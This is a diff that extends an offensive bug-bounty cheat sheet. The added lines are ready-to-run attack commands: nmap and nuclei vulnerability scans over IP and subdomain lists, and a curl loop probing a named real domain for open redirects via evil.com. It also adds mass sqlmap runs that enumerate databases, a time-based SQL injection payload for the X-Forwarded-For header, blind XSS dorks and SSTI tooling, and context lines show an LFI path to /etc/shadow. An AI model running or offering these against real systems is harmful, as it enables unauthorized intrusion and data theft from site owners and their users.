@@ -80,7 +80,12 @@ site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27locat
 
 -----------------------------------------------------------------------------------------------------
 Automatic scanners 
-1- nuclei 	=> nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
+1- nuclei 
+	-nuclei -df httpx.txt -t /home/nuclei-templates -o nucleioutput
+	-nuclei -list urls.txt -t /fuzzing-templates
+	-nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-
+templates/exposures -t /root/nuclei-templates/sqli.yaml
+	- nuclei -u https://example.com -w workflows/
 2- whatweb --no-errors 10.10.10.0/24
 3-wpscan =>  Wpscan --url https://site.com/wordpress -e at -e ap -e u	--api-token ----------------
 4- echo subdomains.txt | httpx --silent | nuclei -t php8-dev-rce.yaml
@@ -179,7 +184,10 @@ link:www.hackerone.com | link:www.slack.com | link:www.github.com
 -----------------------------------------------------------------------------------------------------
 Nmap 
 Nmap
-
+nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt 
+nmap 192.168.1.1 -Pn -sS -A -sV -sC -p ......  --script=vuln
+nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting)
+nc -nvz 192.168.1.4 1-65535
     $ nmap -sC -sV [target address or network range] -oA
     nameofoutput
     $ nmap -p- [target address] -oA allportscan
@@ -550,8 +558,9 @@ CRLF
 Open Redirect
 1- https://target.com/logout?redirect=////google.com
 2- cat httpx.txt | waybackurls | tee wayback.txt ; cat wayback.txt | sort -u | grep "\?">> open.txt;nuclei -t Url-Redirection-Catcher.yaml -l openredirect.txt
-3- httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 		or ////eveil.com
-4- 
+3- waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+4- httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 		or ////eveil.com
+
 --------------------------------------------------------------------------------------------------
 LFI
 1- https://example.com/api/download/..%2f..%2f..%2f..%2fetc%2fshadow
@@ -648,6 +657,12 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 	<ScRiPt >confirm(1)</ScRiPt> [❌Blocked]
 	
 	PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
+------------------------------------------------------------------------------------------------------------
+Blind XSS 
+1- site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" |
+inurl:"contact-form"
+	## Go to xss.report website and create an account to test for blind xss Vulnerbilitites
+2- Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
 Signup
@@ -1024,6 +1039,7 @@ ssti
 	source venv/bin/activate
 	pip install -r requirements.txt
 	./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=blah
+	- ./tplmap.py -u "domain.com/?parameter=SSTI*"
 
 
 2- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
@@ -1067,7 +1083,10 @@ SQLI
 
 	- gf sqli allparam.txt >> allsqli.txt	
 	- sqlmap -m allsqli.txt --dbs --batch --crawl=2 --forms  --random-agent --level 3 --risk 2 | tee sqlmap.txt
-	
+
+- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --
+batch --random-agent --level 1 | tee sqlmap.txt
+
 3- use ghauri => as sqlmap but more advanced 
 
 4- put  1"AND(SELECT1(SELECT(SLEEP(20)))im4x)-- im4x	==> in all headers
@@ -1198,6 +1217,9 @@ tools:
 Httpx 
 
  cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
+
 -------------------------------------------------------------------------------------------------------
 Burpsuite
 1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
@@ -1264,6 +1286,7 @@ Cors bypass
 
 Automatic Scanners :- 
     https://github.com/chenjj/CORScanner
+	- corscanner -i live_subdomains.txt -v -t 100
     https://github.com/lc/theftfuzzer
     https://github.com/s0md3v/Corsy
     https://github.com/Shivangx01b/CorsMe
